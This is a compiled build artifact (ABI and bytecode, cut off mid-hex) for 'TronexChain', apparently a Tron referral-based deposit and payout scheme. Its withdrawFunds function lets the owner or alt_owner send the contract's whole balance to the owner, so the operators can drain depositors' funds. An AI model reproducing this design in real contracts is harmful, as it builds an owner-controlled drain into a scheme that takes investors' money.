{
  "contractName": "TronexChain",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "PERCENTS_DIVIDER",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "TIME_STEP",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "fee2",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "aff_bonus",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "BASE_PERCENT",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "CONTRACT_BALANCE_STEP",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "promo_fee",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "total_withdraw",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "max_receivable",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "name": "users",
      "outputs": [
        {
          "name": "upline",
          "type": "address"
        },
        {
          "name": "referrals",
          "type": "uint256"
        },
        {
          "name": "payouts",
          "type": "uint256"
        },
        {
          "name": "direct_bonus",
          "type": "uint256"
        },
        {
          "name": "gen_bonus",
          "type": "uint256"
        },
        {
          "name": "deposit_amount",
          "type": "uint256"
        },
        {
          "name": "deposit_payouts",
          "type": "uint256"
        },
        {
          "name": "deposit_time",
          "type": "uint40"
        },
        {
          "name": "total_deposits",
          "type": "uint256"
        },
        {
          "name": "total_payouts",
          "type": "uint256"
        },
        {
          "name": "total_structure",
          "type": "uint256"
        },
        {
          "name": "team_biz",
          "type": "uint256"
        },
        {
          "name": "isActive",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "alt_owner",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "name": "ref_bonuses",
      "outputs": [
        {
          "name": "",
          "type": "uint8"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "team_levels",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "fee1",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "total_deposited",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "MIN_DEPOSIT",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "total_users",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "admin_fee",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "name": "_owner",
          "type": "address"
        },
        {
          "name": "_alt_owner",
          "type": "address"
        },
        {
          "name": "_fee1",
          "type": "address"
        },
        {
          "name": "_fee2",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "name": "addr",
          "type": "address"
        },
        {
          "indexed": true,
          "name": "upline",
          "type": "address"
        }
      ],
      "name": "Upline",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "name": "addr",
          "type": "address"
        },
        {
          "indexed": false,
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "NewDeposit",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "name": "addr",
          "type": "address"
        },
        {
          "indexed": true,
          "name": "from",
          "type": "address"
        },
        {
          "indexed": false,
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "DirectPayout",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "name": "addr",
          "type": "address"
        },
        {
          "indexed": true,
          "name": "from",
          "type": "address"
        },
        {
          "indexed": false,
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "MatchPayout",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "name": "addr",
          "type": "address"
        },
        {
          "indexed": false,
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "Withdraw",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "name": "addr",
          "type": "address"
        },
        {
          "indexed": false,
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "LimitReached",
      "type": "event"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_upline",
          "type": "address"
        }
      ],
      "name": "deposit",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "withdraw",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "_addr",
          "type": "address"
        }
      ],
      "name": "payoutOf",
      "outputs": [
        {
          "name": "payout",
          "type": "uint256"
        },
        {
          "name": "max_payout",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "_addr",
          "type": "address"
        }
      ],
      "name": "getUserDividends",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "getContractBalance",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "_balance",
          "type": "uint256"
        }
      ],
      "name": "getTotalSteps",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "pure",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "getRate",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "getContractBonus",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "_amount",
          "type": "uint256"
        }
      ],
      "name": "maxPayoutOf",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "_addr",
          "type": "address"
        }
      ],
      "name": "getUserBalance",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_maxRecPercent",
          "type": "uint256"
        }
      ],
      "name": "changeMaxRec",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "withdrawFunds",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_newAdmin",
          "type": "address"
        }
      ],
      "name": "changeAdmin",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_newfee1",
          "type": "address"
        }
      ],
      "name": "changeFee1",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_newfee2",
          "type": "address"
        }
      ],
      "name": "changeFee2",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "getAdmin",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "getNow",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "_addr",
          "type": "address"
        }
      ],
      "name": "userInfo",
      "outputs": [
        {
          "name": "upline",
          "type": "address"
        },
        {
          "name": "deposit_time",
          "type": "uint40"
        },
        {
          "name": "deposit_amount",
          "type": "uint256"
        },
        {
          "name": "payouts",
          "type": "uint256"
        },
        {
          "name": "direct_bonus",
          "type": "uint256"
        },
        {
          "name": "gen_bonus",
          "type": "uint256"
        },
        {
          "name": "user_status",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "_addr",
          "type": "address"
        }
      ],
      "name": "userInfoTotals",
      "outputs": [
        {
          "name": "referrals",
          "type": "uint256"
        },
        {
          "name": "total_deposits",
          "type": "uint256"
        },
        {
          "name": "total_payouts",
          "type": "uint256"
        },
        {
          "name": "total_structure",
          "type": "uint256"
        },
        {
          "name": "team_biz",
          "type": "uint256"
        },
        {
          "name": "deposit_payouts",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "contractInfo",
      "outputs": [
        {
          "name": "_total_users",
          "type": "uint256"
        },
        {
          "name": "_total_deposited",
          "type": "uint256"
        },
        {
          "name": "_total_withdraw",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    }
  ],
  "bytecode": "0x60806040526000600455601e600555606460065560196007556001600a553480156200002a57600080fd5b50d380156200003857600080fd5b50d280156200004657600080fd5b5060405160808062004be2833981018060405260808110156200006857600080fd5b8101908080519060200190929190805190602001909291908051906020019092919080519060200190929190505050836000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555082600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555081600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555080600360006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506009601e908060018154018082558091505090600182039060005260206000209060209182820401919006909192909190916101000a81548160ff021916908360ff160217905550506009600a908060018154018082558091505090600182039060005260206000209060209182820401919006909192909190916101000a81548160ff021916908360ff1602179055505060096005908060018154018082558091505090600182039060005260206000209060209182820401919006909192909190916101000a81548160ff021916908360ff1602179055505060096005908060018154018082558091505090600182039060005260206000209060209182820401919006909192909190916101000a81548160ff021916908360ff1602179055505060096005908060018154018082558091505090600182039060005260206000209060209182820401919006909192909190916101000a81548160ff021916908360ff1602179055505060096005908060018154018082558091505090600182039060005260206000209060209182820401919006909192909190916101000a81548160ff021916908360ff1602179055505060096005908060018154018082558091505090600182039060005260206000209060209182820401919006909192909190916101000a81548160ff021916908360ff1602179055505060096005908060018154018082558091505090600182039060005260206000209060209182820401919006909192909190916101000a81548160ff021916908360ff1602179055505060096005908060018154018082558091505090600182039060005260206000209060209182820401919006909192909190916101000a81548160ff021916908360ff16021790555050505050506147a3806200043f6000396000f3fe60806040526004361061024d576000357c010000000000000000000000000000000000000000000000000000000090048063775105e11161014b578063bbe4fd50116100c8578063de560cca1161008c578063de560cca14610faa578063e1e158a514610fef578063e7cc62bd14611034578063f340fa0114611079578063fee3f7f9146110bd5761024d565b8063bbe4fd5014610dff578063bf6e196414610e44578063c34f457a14610e89578063c609825614610ef4578063ca42feab14610f655761024d565b80639a8318f41161010f5780639a8318f414610b885780639acb6b2d14610bcd578063a87430ba14610c12578063b741c62a14610d1f578063b7d9f0d214610d905761024d565b8063775105e114610993578063850404a1146109d85780638959af3c14610a435780638da5cb5b14610aac5780638f28397014610b1d5761024d565b806347734892116101d95780636aabddee1161019d5780636aabddee146107705780636da61d1e146107b55780636e9960c31461083b5780636f9fb98a146108ac57806374b95b2d146108f15761024d565b806347734892146105cd578063517540841461064c5780635988859f1461069157806362f3765e146106e6578063679aefce1461072b5761024d565b80631cf0160c116102205780631cf0160c1461044c57806324600fc3146104b557806332bc298c146104e657806339f73a481461052b5780633ccfd60b1461059c5761024d565b806301c234a814610252578063040a772e1461029757806315c43aaf146103165780631959a00214610369575b600080fd5b34801561025e57600080fd5b50d3801561026b57600080fd5b50d2801561027857600080fd5b50610281611102565b6040518082815260200191505060405180910390f35b3480156102a357600080fd5b50d380156102b057600080fd5b50d280156102bd57600080fd5b50610300600480360360208110156102d457600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050611108565b6040518082815260200191505060405180910390f35b34801561032257600080fd5b50d3801561032f57600080fd5b50d2801561033c57600080fd5b506103456113f1565b60405180848152602001838152602001828152602001935050505060405180910390f35b34801561037557600080fd5b50d3801561038257600080fd5b50d2801561038f57600080fd5b506103d2600480360360208110156103a657600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061140a565b604051808873ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018764ffffffffff1664ffffffffff16815260200186815260200185815260200184815260200183815260200182815260200197505050505050505060405180910390f35b34801561045857600080fd5b50d3801561046557600080fd5b50d2801561047257600080fd5b5061049f6004803603602081101561048957600080fd5b8101908080359060200190929190505050611634565b6040518082815260200191505060405180910390f35b3480156104c157600080fd5b50d380156104ce57600080fd5b50d280156104db57600080fd5b506104e46116a4565b005b3480156104f257600080fd5b50d380156104ff57600080fd5b50d2801561050c57600080fd5b50610515611841565b6040518082815260200191505060405180910390f35b34801561053757600080fd5b50d3801561054457600080fd5b50d2801561055157600080fd5b5061055a611846565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b3480156105a857600080fd5b50d380156105b557600080fd5b50d280156105c257600080fd5b506105cb61186c565b005b3480156105d957600080fd5b50d380156105e657600080fd5b50d280156105f357600080fd5b506106366004803603602081101561060a57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061221a565b6040518082815260200191505060405180910390f35b34801561065857600080fd5b50d3801561066557600080fd5b50d2801561067257600080fd5b5061067b6126f3565b6040518082815260200191505060405180910390f35b34801561069d57600080fd5b50d380156106aa57600080fd5b50d280156106b757600080fd5b506106e4600480360360208110156106ce57600080fd5b81019080803590602001909291905050506126f8565b005b3480156106f257600080fd5b50d380156106ff57600080fd5b50d2801561070c57600080fd5b5061071561281e565b6040518082815260200191505060405180910390f35b34801561073757600080fd5b50d3801561074457600080fd5b50d2801561075157600080fd5b5061075a612823565b6040518082815260200191505060405180910390f35b34801561077c57600080fd5b50d3801561078957600080fd5b50d2801561079657600080fd5b5061079f61288b565b6040518082815260200191505060405180910390f35b3480156107c157600080fd5b50d380156107ce57600080fd5b50d280156107db57600080fd5b5061081e600480360360208110156107f257600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050612892565b604051808381526020018281526020019250505060405180910390f35b34801561084757600080fd5b50d3801561085457600080fd5b50d2801561086157600080fd5b5061086a612b74565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b3480156108b857600080fd5b50d380156108c557600080fd5b50d280156108d257600080fd5b506108db612b9d565b6040518082815260200191505060405180910390f35b3480156108fd57600080fd5b50d3801561090a57600080fd5b50d2801561091757600080fd5b5061095a6004803603602081101561092e57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050612bbc565b60405180878152602001868152602001858152602001848152602001838152602001828152602001965050505050505060405180910390f35b34801561099f57600080fd5b50d380156109ac57600080fd5b50d280156109b957600080fd5b506109c2612d6c565b6040518082815260200191505060405180910390f35b3480156109e457600080fd5b50d380156109f157600080fd5b50d280156109fe57600080fd5b50610a4160048036036020811015610a1557600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050612d72565b005b348015610a4f57600080fd5b50d38015610a5c57600080fd5b50d28015610a6957600080fd5b50610a9660048036036020811015610a8057600080fd5b8101908080359060200190929190505050612f2a565b6040518082815260200191505060405180910390f35b348015610ab857600080fd5b50d38015610ac557600080fd5b50d28015610ad257600080fd5b50610adb612f67565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b348015610b2957600080fd5b50d38015610b3657600080fd5b50d28015610b4357600080fd5b50610b8660048036036020811015610b5a57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050612f8c565b005b348015610b9457600080fd5b50d38015610ba157600080fd5b50d28015610bae57600080fd5b50610bb76130eb565b6040518082815260200191505060405180910390f35b348015610bd957600080fd5b50d38015610be657600080fd5b50d28015610bf357600080fd5b50610bfc6130f1565b6040518082815260200191505060405180910390f35b348015610c1e57600080fd5b50d38015610c2b57600080fd5b50d28015610c3857600080fd5b50610c7b60048036036020811015610c4f57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506130f7565b604051808e73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018d81526020018c81526020018b81526020018a81526020018981526020018881526020018764ffffffffff1664ffffffffff1681526020018681526020018581526020018481526020018381526020018281526020019d505050505050505050505050505060405180910390f35b348015610d2b57600080fd5b50d38015610d3857600080fd5b50d28015610d4557600080fd5b50610d4e61318e565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b348015610d9c57600080fd5b50d38015610da957600080fd5b50d28015610db657600080fd5b50610de360048036036020811015610dcd57600080fd5b81019080803590602001909291905050506131b4565b604051808260ff1660ff16815260200191505060405180910390f35b348015610e0b57600080fd5b50d38015610e1857600080fd5b50d28015610e2557600080fd5b50610e2e6131e7565b6040518082815260200191505060405180910390f35b348015610e5057600080fd5b50d38015610e5d57600080fd5b50d28015610e6a57600080fd5b50610e736131ef565b6040518082815260200191505060405180910390f35b348015610e9557600080fd5b50d38015610ea257600080fd5b50d28015610eaf57600080fd5b50610ef260048036036020811015610ec657600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506131f5565b005b348015610f0057600080fd5b50d38015610f0d57600080fd5b50d28015610f1a57600080fd5b50610f236133ad565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b348015610f7157600080fd5b50d38015610f7e57600080fd5b50d28015610f8b57600080fd5b50610f946133d3565b6040518082815260200191505060405180910390f35b348015610fb657600080fd5b50d38015610fc357600080fd5b50d28015610fd057600080fd5b50610fd9613438565b6040518082815260200191505060405180910390f35b348015610ffb57600080fd5b50d3801561100857600080fd5b50d2801561101557600080fd5b5061101e61343e565b6040518082815260200191505060405180910390f35b34801561104057600080fd5b50d3801561104d57600080fd5b50d2801561105a57600080fd5b50611063613445565b6040518082815260200191505060405180910390f35b6110bb6004803603602081101561108f57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061344b565b005b3480156110c957600080fd5b50d380156110d657600080fd5b50d280156110e357600080fd5b506110ec613462565b6040518082815260200191505060405180910390f35b61271081565b6000803073ffffffffffffffffffffffffffffffffffffffff16638959af3c600860008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600501546040518263ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004018082815260200191505060206040518083038186803b1580156111ba57600080fd5b505afa1580156111ce573d6000803e3d6000fd5b505050506040513d60208110156111e457600080fd5b810190808051906020019092919050505090506000611201613468565b9050600082600860008773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206006015410156113e657600860008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206006015461271060b4600860008973ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060070160009054906101000a900464ffffffffff1664ffffffffff1642038115156112fd57fe5b0484600860008a73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060050154020281151561134d57fe5b040390508281600860008873ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600601540111156113e557600860008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060060154830390505b5b809350505050919050565b6000806000600a54600b54600c54925092509250909192565b6000806000806000806000600860008973ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060000160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16600860008a73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060070160009054906101000a900464ffffffffff16600860008b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060050154600860008c73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020154600860008d73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060030154600860008e73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060040154600860008f73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600c01549650965096509650965096509650919395979092949650565b6000806000905060008090506000620f4240850290506000629896808281151561165a57fe5b0490506032811115156116765760028102935060009250611690565b6064935060026064600283020381151561168c57fe5b0492505b600083850190508095505050505050919050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16148061174c5750600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16145b15156117c0576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600b8152602001807f4e6f7420616c6c6f77656400000000000000000000000000000000000000000081525060200191505060405180910390fd5b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f1935050505015801561183e573d6000803e3d6000fd5b50565b60b481565b600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000803073ffffffffffffffffffffffffffffffffffffffff16636da61d1e336040518263ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050604080518083038186803b15801561190757600080fd5b505afa15801561191b573d6000803e3d6000fd5b505050506040513d604081101561193157600080fd5b8101908080519060200190929190805190602001909291905050509150915080600860003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020154101515611a09576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600c8152602001807f46756c6c207061796f757473000000000000000000000000000000000000000081525060200191505060405180910390fd5b6000821115611b51578082600860003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020154011115611aa657600860003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020154810391505b81600860003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206006016000828254019250508190555081600860003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020160008282540192505081905550611b5033836134d0565b5b80600860003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020154108015611be457506000600860003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060030154115b15611d6b576000600860003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206003015490508181600860003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020154011115611cc457600860003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020154820390505b80600860003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206003016000828254039250508190555080600860003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600201600082825401925050819055508083019250505b80600860003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020154108015611dfe57506000600860003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060040154115b15611f85576000600860003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206004015490508181600860003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020154011115611ede57600860003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020154820390505b80600860003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206004016000828254039250508190555080600860003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600201600082825401925050819055508083019250505b600082111515611ffd576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600b8152602001807f5a65726f207061796f757400000000000000000000000000000000000000000081525060200191505060405180910390fd5b81600860003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206009016000828254019250508190555081600c600082825401925050819055503373ffffffffffffffffffffffffffffffffffffffff166108fc839081150290604051600060405180830381858888f193505050501580156120a3573d6000803e3d6000fd5b503373ffffffffffffffffffffffffffffffffffffffff167f884edad9ce6fa2440d8a54cc123490eb96d2768479d49ff9c7366125a9424364836040518082815260200191505060405180910390a280600860003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020154101515612216573373ffffffffffffffffffffffffffffffffffffffff167f97ddeb77c85e6a1dd99a34fe2bb1a4f9b211d5ffced7a707de9dbeb24363d0e4600860003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600201546040518082815260200191505060405180910390a26000600860003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600c01819055505b5050565b60008060003073ffffffffffffffffffffffffffffffffffffffff16636da61d1e856040518263ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050604080518083038186803b1580156122b757600080fd5b505afa1580156122cb573d6000803e3d6000fd5b505050506040513d60408110156122e157600080fd5b81019080805190602001909291908051906020019092919050505091509150600082111561239e578082600860008773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206002015401111561239d57600860008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020154810391505b5b80600860008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020154108015612431575060006008600086